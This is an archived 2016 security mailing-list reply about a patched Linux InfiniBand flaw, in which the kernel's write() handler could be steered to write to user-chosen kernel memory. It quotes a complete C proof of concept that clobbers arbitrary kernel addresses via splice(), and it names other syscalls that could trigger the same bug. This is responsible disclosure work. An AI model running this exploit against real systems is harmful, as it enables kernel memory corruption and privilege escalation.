From: Jann Horn <jann-XZ1E9jl8jIdeoWH0uzbU5w@public.gmane.org>
Subject: Re: [oss-security] CVE Request: Linux: IB/security: Restrict use of
 the write() interface'
Date: Mon, 9 May 2016 21:39:55 +0200
Message-ID: <20160509193955.GA3317@pc.thejh.net>
References: <20160507042232.GA5286@eldamar.local>
 <1462645186.4268.27.camel@opteya.com>
 <20160509180208.GB6372@pc.thejh.net>
 <1462821041.4268.43.camel@opteya.com>
Mime-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha1;
	protocol="application/pgp-signature"; boundary="HcAYCG3uE/tztfnV"
Return-path: <linux-rdma-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
Content-Disposition: inline
In-Reply-To: <1462821041.4268.43.camel-RlY5vtjFyJ3QT0dZR+AlfA@public.gmane.org>
Sender: linux-rdma-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
To: Yann Droneaud <ydroneaud-RlY5vtjFyJ3QT0dZR+AlfA@public.gmane.org>
Cc: Jason Gunthorpe <jgunthorpe-ePGOBjL8dl3ta4EC/59zMFaTQe2KTcn/@public.gmane.org>, Doug Ledford <dledford-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org>, linux-rdma-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, oss-security-ZwoEplunGu1jrUoiu81ncdBPR1lH4CV8@public.gmane.org
List-Id: linux-rdma@vger.kernel.org


--HcAYCG3uE/tztfnV
Content-Type: text/plain; charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

On Mon, May 09, 2016 at 09:10:41PM +0200, Yann Droneaud wrote:
> [Cc:=A0oss-security-ZwoEplunGu1jrUoiu81ncdBPR1lH4CV8@public.gmane.org]
>=20
> Hi,
>=20
> Le lundi 09 mai 2016 =E0 20:02 +0200, Jann Horn a =E9crit=A0:
> > On Sat, May 07, 2016 at 08:19:46PM +0200, Yann Droneaud wrote:
> > > Le samedi 07 mai 2016 =E0 06:22 +0200, Salvatore Bonaccorso a =E9crit=
=A0:
> > > >=20
> > > > =A0
> > > > Jann Horn reported an issue in the infiniband stack. It has been
> > > > fixed in v4.6-rc6 with commit
> > > > e6bd18f57aad1a2d1ef40e646d03ed0f2515c9e3:
> > > >=20
> > > > https://git.kernel.org/linus/e6bd18f57aad1a2d1ef40e646d03ed0f2515c9=
e3
> > > >=20
> > > > >=20
> > > > >=20
> > > > > IB/security: Restrict use of the write() interface
> > > > > The drivers/infiniband stack uses write() as a replacement for
> > > > > bi-directional ioctl().=A0=A0This is not safe. There are ways to
> > > > > trigger write calls that result in the return structure that
> > > > > is normally written to user space being shunted off to user
> > > > > specified kernel memory instead.
> > > > >=20
> > > That's an interesting issue.
> > >=20
> > > I thought access_ok() done as part of copy_to_user() would protect
> > > from such unwelcomed behavior. But it's not if the kernel invoke
> > > write() handler outside of a user process.
> > >=20
> > > Anyway, as I don't see yet how to reproduce the issue, is there a
> > > PoC available, I would be interested by a mean to trigger such
> > > write().
>=20
> > Here is my writeup of the issue that I made quite a while ago - the
> > timeline is missing some of the more recent stuff, but meh.
> >=20
> > =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D
> >=20
> >=20
> > Here is a PoC that can be used to clobber data at arbitrary
> > writable kernel addresses if the rdma_ucm module is loaded (without
> > actually needing Infiniband hardware to be present):
> >=20
> > =3D=3D=3D=3D=3D
> > #define _GNU_SOURCE
> > #include=20
> > #include=20
> > #include=20
> > #include=20
> > #include=20
> > #include=20
> >=20
> > #include=20
> > #include=20
> > #include=20
> > #include=20
> > #include=20
> >=20
> > #define RDMA_PS_TCP 0x0106
> >=20
> > // This method forces the kernel to write arbitrary data to the
> > // target fd under set_fs(KERNEL_DS), bypassing address limit
> > // checks in anything that extracts pointers from written data.
> > int write_without_addr_limit(int fd, char *buf, size_t len) {
> > =A0 int pipefds[2];
> > =A0 if (pipe(pipefds))
> > =A0=A0=A0=A0return -1;
> > =A0 ssize_t len_ =3D write(pipefds[1], buf, len);
> > =A0 if (len =3D=3D -1)
> > =A0=A0=A0=A0return -1;
> > =A0 int res =3D splice(pipefds[0], NULL, fd, NULL, len_, 0);
> > =A0 int errno_ =3D errno;
> > =A0 close(pipefds[0]);
> > =A0 close(pipefds[1]);
> > =A0 errno =3D errno_;
> > =A0 return res;
> > }
> >=20
> > int clobber_kaddr(unsigned long kaddr) {
> > =A0 // open infiniband fd
> > =A0 int fd =3D open("/dev/infiniband/rdma_cm", O_RDWR);
> > =A0 if (fd =3D=3D -1)
> > =A0=A0=A0=A0err(1, "unable to open /dev/infiniband/rdma_cm - maybe the =
RDMA kernel module isn't loaded?");
> >=20
> > =A0 // craft malicious write buffer
> > =A0 // structure:
> > =A0 //=A0=A0=A0struct rdma_ucm_cmd_hdr hdr
> > =A0 //=A0=A0=A0struct rdma_ucm_create_id cmd
> > =A0 char buf[sizeof(struct rdma_ucm_cmd_hdr) + sizeof(struct rdma_ucm_c=
reate_id)];
> > =A0 struct rdma_ucm_cmd_hdr *hdr =3D (void*)buf;
> > =A0 struct rdma_ucm_create_id *cmd =3D (void*)(buf + sizeof(struct rdma=
_ucm_cmd_hdr));
> > =A0 hdr->cmd =3D RDMA_USER_CM_CMD_CREATE_ID;
> > =A0 hdr->in =3D 0;
> > =A0 hdr->out =3D sizeof(struct rdma_ucm_create_id_resp);
> > =A0 cmd->ps =3D RDMA_PS_TCP;
> > =A0 cmd->response =3D kaddr;
> >=20
> > =A0 int res =3D write_without_addr_limit(fd, buf, sizeof(buf));
> > =A0 int errno_ =3D errno;
> > =A0 close(fd);
> > =A0 errno =3D errno_;
> > =A0 return res;
> > }
> >=20
> > int main(int argc, char **argv) {
> > =A0 if (argc !=3D 2)
> > =A0=A0=A0=A0errx(1, "want one argument (kernel address to clobber)");
> > =A0 char *endp;
> > =A0 unsigned long kaddr =3D strtoul(argv[1], &endp, 0);
> > =A0 if (kaddr =3D=3D ULONG_MAX || *endp || endp =3D=3D argv[1])
> > =A0=A0=A0=A0errx(1, "bad input number");
> >=20
> > =A0 int r =3D clobber_kaddr(kaddr);
> > =A0 if (r >=3D 0) {
> > =A0=A0=A0=A0printf("that probably worked? clobber_kaddr(0x%lx)=3D%d\n",=
 kaddr, r);
> > =A0=A0=A0=A0return 0;
> > =A0 } else {
> > =A0=A0=A0=A0printf("failed: %m\n");
> > =A0=A0=A0=A0return 1;
> > =A0 }
> > }
>=20
>=20
> Is this only achievable through splice() ?

sendfile() and the new copy_file_range() syscall (in kernel >=3D4.5) would
probably both work, too - they all use the splice mechanism internally.

ecryptfs also calls the VFS methods of the lower filesystem under KERNEL_DS
iirc, it might also be possible to attack infiniband that way.

--HcAYCG3uE/tztfnV
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: Digital signature

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBAgAGBQJXMOeLAAoJED4KNFJOeCOoGScP/2B+sm1QWBEb4c+Z53p3WnBF
89WnjBc6E70x3zuC+GYUjqE6GpyUErG3U1iZt/YZiXuXfCjrPUEPmgh5eq7YPwhZ
7gd79Bzv7xJsl/otzos0ZpvvC4YJXQIXb1LUyF/g1aVbaTXEVuWwj+kpT3DsqOZq
AKlnzMInSWi1J7z8WYdwLoW5JEWWsRmDjAyPXar3Q1IcG8I3rfOyK4XmRwfo+i3L
+bltYEyEJg5aDct/5B3/3RGeaH6QfTLViUVk7M4dcWUtdjRYhu7vhqzUxtL8tSPg
SQCIaOJgoNzUw/UNKcklDVxFcXA3CvGriDn1zZeGIWep5BLCMUOS/kgFocqKMm4Y
oiIbwSGlRxhCo7klbMI5HaoF/QHEsv4Y3MGSWhQ6jJC3YP5pss3+qf2bLJXp8z2K
NSD/4MbAzt4Vyysx4irrgM76XtK3CNtXFAkAfA0+JDk39o1USZv9W798bGyF882c
ie7Q0O31y5cs282KtmMAW9jp1FXWy9pBir0cbDvSssXtsIzVJ4s+aH+A7u3S41Mr
83mzW4RPN0V2FYfC5EbKgtW21PwaQAx1y5Ih4iXwZHx1I9UqKNEDhgHiRvxJws04
yuCvNgMLVkseYbJ+eLGdDrwrHQoSqKZhopHG/O2OBRyYVzPnzrUb6HbltkCGjBsv
ikZNdgRGO0I6pkG6iluq
=mB61
-----END PGP SIGNATURE-----

--HcAYCG3uE/tztfnV--
--
To unsubscribe from this list: send the line "unsubscribe linux-rdma" in
the body of a message to majordomo-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
More majordomo info at  http://vger.kernel.org/majordomo-info.html
